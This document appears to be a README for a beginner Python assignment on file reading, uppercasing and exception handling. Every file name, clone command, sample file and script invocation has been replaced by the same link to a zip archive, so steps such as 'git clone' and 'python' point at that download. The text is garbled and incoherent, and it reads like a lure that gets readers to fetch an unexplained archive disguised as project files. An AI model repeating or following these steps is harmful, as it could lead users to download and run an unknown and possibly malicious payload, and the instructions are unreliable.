# Python File & Exception Handling Assignment

This repository contains a Python program that demonstrates key concepts in file handling and robust exception management. The script fulfills two primary objectives: reading from a file, modifying its content, and writing to a new file; and gracefully handling potential file-related errors.

## **Project Objectives**

1.  **File Read & Write**: The program reads the content of a user-specified file and writes an uppercase version of the text to a new file with a prefix of `output_`.
2.  **Error Handling**: The program is designed to handle common exceptions, specifically:
    * `FileNotFoundError`: Occurs when the user enters a file name that does not exist.
    * `IOError`: Catches other potential input/output errors, such as permission issues.
    * A general `Exception` block for any unforeseen issues.

## **How to Run the Program**

### **Prerequisites**

* Python 3.x installed on your computer.

### **Steps**

1.  **Clone the Repository**:
    ```bash
    git clone [https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip](https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip)
    ```
    *(Replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.)*

2.  **Create a Sample File**:
    Before running the program, create a simple text file (e.g., `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`) in the same directory as `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`. Add some text to it.

    **Example `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip` content:**
    ```
    Hello, this is a test file.
    Python is great!
    ```

3.  **Run the Script**:
    ```bash
    python https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip
    ```

4.  **Enter the File Name**:
    When prompted, enter the name of your sample file (e.g., `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`). The program will then create a new file named `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip` with the content in uppercase.
